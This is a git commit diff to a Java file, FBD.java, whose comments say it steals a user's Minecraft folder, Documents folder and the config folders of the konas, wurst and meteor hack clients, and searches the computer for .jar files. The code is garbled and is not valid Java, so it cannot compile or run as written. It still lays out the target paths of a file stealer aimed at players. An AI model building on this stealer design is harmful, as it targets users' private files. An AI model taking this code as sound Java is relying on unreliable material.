8a0f28c8e11a9e9e11bdcf4d33d031a23ca89912
FERDdeveloper <86313430+FERDdeveloper@users.noreply.github.com>
2021-10-15 15:14:07 +0200

    Update FBD.java

--- FB/FBD.java
+++ FB/FBD.java
@@ -1,13 +1,17 @@
 public class FBD {
-    var1;var2;
+    var1=new Var();var2=new Var();var3=new Var();
     static {
         //steals minecraft folders(i'm not gonna show how to upload these folders to your computer, i'm not cybercriminal)
-        var1.getArgs(); System.getProperty("minecraft") + ("Appdata/roaming/.minecraft/");
+        var1 = System.getProperty("user's home") + ("C:/Users/{user}/Appdata/roaming/.minecraft/");
         //steals documents(folders)
-        var2.getArgs(); System.getProperty("Documents") + ("this computer/documents/");
+        var2 = System.getProperty("user's home") + ("C:/Users/{user}/this computer/documents/");
+        //steals mc hack client configs
+        var3 = System.getProperty("user's home") + ("C:/Users/{user}/AppData/roaming/.minecraft/konas");
+        var3 = System.getProperty("user's home") + ("C:/Users/{user}/Appdata/roaming/.minecraft/wurst");
+        var3 = System.getProperty("user's home") + ("C:/Users/{user}/Appdata/roaming/.minecraft/meteor");
         int 1  {
             //searches computer for .jar files
-            byte[] ".jar" + filename;
+            byte[kl] ".jar" + filename;
         }
     }
 }
